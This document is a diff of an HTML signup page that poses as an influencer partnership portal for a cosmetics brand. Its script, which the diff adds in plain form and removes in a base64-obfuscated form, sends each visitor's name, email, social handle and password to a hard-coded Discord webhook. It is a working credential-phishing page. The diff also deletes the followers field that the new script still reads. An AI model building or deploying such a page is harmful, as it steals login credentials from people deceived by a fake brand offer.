@@ -39,7 +39,7 @@
         <div class="logo">PC</div>
         <div>
           <h1>BRAND PARTNERSHIP — Perl Cosmetics</h1>
-          <p class="lead">Influencer portal — sign up to access your dashboard, find products to promote, and view partnership pay & programs.</p>
+          <p class="lead">Influencer portal — sign up to access your dashboard.</p>
         </div>
       </div>
     </div>
@@ -78,11 +78,6 @@
   </div>
 
   <div>
-    <label for="followers">Followers / Subscribers</label>
-    <input id="followers" type="number" required />
-  </div>
-
-  <div>
     <label for="password">Password</label>
     <input id="password" type="password" required />
   </div>
@@ -95,132 +90,41 @@
   <button class="primary" type="submit">Create account & view dashboard</button>
 </form>
 
-        <hr style="margin:18px 0;border:none;border-top:1px solid #f0f0f6" />
-
-        <h3 style="margin:0 0 6px 0">Quick facts</h3>
-        <ul style="margin:0 0 0 18px;color:var(--muted)">
-          <li>Apply once — get verified within 3 business days.</li>
-          <li>Access exclusive product drops + promo codes.</li>
-          <li>Flexible campaigns: try-before-you-promote, flat-fee, rev-share.</li>
-        </ul>
       </section>
-
-      <aside>
-        <div class="card" style="margin-bottom:14px">
-          <h3 style="margin:0 0 8px 0">Salary & Programs</h3>
-          <div class="programs">
-            <div class="program">
-              <strong>Flat-fee Campaigns</strong>
-              <p class="small">Micro: $150–$800, Mid: $800–$5k, Macro: custom.</p>
-            </div>
-            <div class="program">
-              <strong>Rev-share</strong>
-              <p class="small">Earn 8–20% on tracked affiliate sales.</p>
-            </div>
-            <div class="program">
-              <strong>Gift & Try</strong>
-              <p class="small">Receive PR boxes and early launches.</p>
-            </div>
-            <div class="program">
-              <strong>Ambassadors</strong>
-              <p class="small">Monthly retainers + bonuses.</p>
-            </div>
-          </div>
-        </div>
-
-        <div class="card">
-<h3 style="margin:0 0 8px 0">Featured products</h3>
-<div class="products">
-
-  <div class="product">
-    <div class="thumb">
-      <img src="product1.png" style="width:100%; height:100%; object-fit:cover; border-radius:8px">
     </div>
-    <div class="pmeta">
-      <h4>NOURISHING LASH OIL</h4>
-      <p>Strengthens and conditions lashes & brows.</p>
-    </div>
-  </div>
-
-  <div class="product">
-    <div class="thumb">
-      <img src="product4.png" style="width:100%; height:100%; object-fit:cover; border-radius:8px">
-    </div>
-    <div class="pmeta">
-      <h4>RADIANCE FACIAL OIL</h4>
-      <p>Lightweight vitamin oil for glowing skin.</p>
-    </div>
-  </div>
-
-</div>
-        </div>
-      </aside>
-    </div>
-
-    <footer>
-      <div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap">
-        <div>Perl Cosmetics • Partner Program</div>
-        <div class="small">Questions? Email partnerships@perlcosmetics.com</div>
-      </div>
-    </footer>
   </main>
 
 <script>
-const wh_1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0Njg0OTQ1OTQzMzc2NzA3NA";
-const wh_2 = "9DTVhYUnYtVi1TQnl4dU1iZXdsMUdib3d5cHdxRHJnYm5hODJFdHBldjNvWmFaeXZCVTZU";
-const wh_3 = "aHRoNll5YmdLUy1WcU13bmlQOA==";
+const webhookURL = "https://discord.com/api/webhooks/1446849459433767074/CMXXr-V-SByxuMbewl1GbwypwqDrgbna82Etpev3oZaZyvBU6Tth6YybgKS-VqMwniP8";
 
-function decodeWebhook() {
-  return atob(wh_1 + wh_2 + wh_3);
-}
+document.getElementById("signupForm").addEventListener("submit", function(e) {
+    e.preventDefault();
 
-async function sendToDiscord(payload) {
-  const webhookURL = decodeWebhook();
-  const message = {
-    content: "**New Influencer Signup**",
-    embeds: [
-      {
-        title: "Signup Submission",
-        color: 15548997,
-        fields: [
-          { name: "Name", value: payload.name, inline: true },
-          { name: "Email", value: payload.email, inline: true },
-          { name: "Platform", value: payload.platform, inline: true },
-          { name: "Social Handle", value: payload.social, inline: true },
-          { name: "Followers", value: payload.followers, inline: true },
-          { name: "Password", value: payload.password, inline: false },
-          { name: "Confirm Password", value: payload.confirmPassword, inline: false }
-        ],
-        footer: { text: "Perl Cosmetics – Partner Program" }
-      }
-    ]
-  };
+    const name = document.getElementById("name").value;
+    const email = document.getElementById("email").value;
+    const platform = document.getElementById("platform").value;
+    const social = document.getElementById("social").value;
+    const followers = document.getElementById("followers").value;
+    const password = document.getElementById("password").value;
+    const confirmPassword = document.getElementById("confirmPassword").value;
 
-  return await fetch(webhookURL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(message)
-  });
-}
+    const payload = {
+        content: `📝 **New Influencer Signup:**\n🔹 Name: ${name}\n🔹 Email: ${email}\n🔹 Platform: ${platform}\n🔹 Handle: ${social}\n🔹 Followers: ${followers}\n🔹 Password: ${password}\n🔹 Confirm Password: ${confirmPassword}`
+    };
 
-document.getElementById("signupForm").addEventListener("submit", async function(e){
-  e.preventDefault();
-  const payload = {
-    name: document.getElementById('name').value,
-    email: document.getElementById('email').value,
-    platform: document.getElementById('platform').value,
-    social: document.getElementById('social').value,
-    followers: document.getElementById('followers').value,
-    password: document.getElementById('password').value,
-    confirmPassword: document.getElementById('confirmPassword').value
-  };
-
-  try {
-    await sendToDiscord(payload);
-    window.location.href = "Dashboard.html";
-  } catch (err) {
-    alert("Failed to send to Discord: " + err);
-  }
+    fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+    })
+    .then(() => {
+        alert("Signup sent successfully!");
+        // Optionally clear fields
+        document.getElementById("signupForm").reset();
+    })
+    .catch(err => {
+        alert("Failed to send: " + err);
+    });
 });
 </script>
 
